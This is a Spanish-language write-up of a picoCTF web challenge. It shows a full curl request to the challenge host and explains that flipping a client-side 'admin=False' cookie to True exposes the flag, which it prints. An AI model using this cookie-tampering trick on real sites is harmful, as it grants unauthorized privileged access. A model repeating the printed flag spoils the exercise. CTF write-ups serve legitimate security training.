
## DESCRIPCIÓN
The factory is hiding things from all of its users.Can you login as Joe and find what they've been looking at?

http://fickle-tempest.picoctf.net:57829

## SOLUCIÓN
Ingresamos al http desde el navegador de firefox, la pista nos indica que solo la cuenta de Joe se verifica su contraseña, entonces usamos un user y password random, como test y test e ingresamos, se nos desbloquea la página html de flag, con el inspector en la seccion de network observamos que el acceso de admin esta del lado del usuario (no del servidor) con admin = False, entonces copiamos la curl del html de flag y nos vamos a la terminal y colocamos:

```
curl 'http://fickle-tempest.picoctf.net:57829/flag' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: password=user; username=user; admin=False' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'

```

Cambiamos el parametro de False a True y nos devuelve el codigo fuente.

Y obtenemos la flag:

picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
## NOTAS ADICIONALES
- curl:  Sirve para transferir datos hacia o desde un servidor.
## REFERENCIAS




